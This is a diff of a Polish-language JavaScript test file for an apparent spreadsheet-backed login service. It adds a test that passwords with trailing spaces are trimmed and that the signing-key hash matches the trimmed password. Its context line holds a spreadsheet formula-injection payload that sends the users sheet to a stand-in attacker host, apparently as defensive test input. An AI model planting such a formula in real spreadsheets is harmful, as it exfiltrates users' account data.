@@ -318,4 +318,12 @@ const F = '=IMPORTXML("https://zly.example/?"&JOIN(",";Uzytkownicy!A:N);"//a")';
   ok('termin hasła paczki DD.MM.RRRR: 12.01.2099 to 12 stycznia (nie 1 grudnia), konto z „Ważne do” jako tekst dostaje hasło', h1.status === 'ok' && h1.wazne_do === '2099-01-12' && h2.wazne_do === '2099-12-31', JSON.stringify([h1, h2]));
   ok('nieczytelny termin hasła paczki → „brak” (hasło nie wychodzi) i wpis w Log', h3.status === 'brak' && !('haslo' in h3) && B.get('Log').w.some(r => r[2] === 'nieczytelna_data' && /haslo_paczki_wazne_do/.test(r[3])), JSON.stringify(h3));
 }
+/* ---- 15. hasło z odstępem na brzegu: serwer przycina, więc klucz podpisu to skrót PRZYCIĘTEGO hasła (web: dostep.js postacHasla) ---- */
+{
+  const B = swiezy();
+  B.post({ akcja: 'zmien_haslo', kod: '22222', stare_haslo: '501502503', nowe_haslo: 'Haslo123 ' });
+  ok('hasło ustawione ze spacją na końcu: logowanie z tą spacją przechodzi', B.post({ akcja: 'logowanie', kod: '22222', haslo: 'Haslo123 ' }).status === 'ok');
+  ok('…puls z kluczem z hasła przyciętego (tak liczy aplikacja web) oddaje komplet, z kluczem z surowego tekstu — nie', B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123') }).pelne === true
+    && B.post({ akcja: 'puls', kod: '22222' }, { hashKlucza: B.hash('22222', 'Haslo123 ') }).pelne === false);
+}
 process.exit(kod);
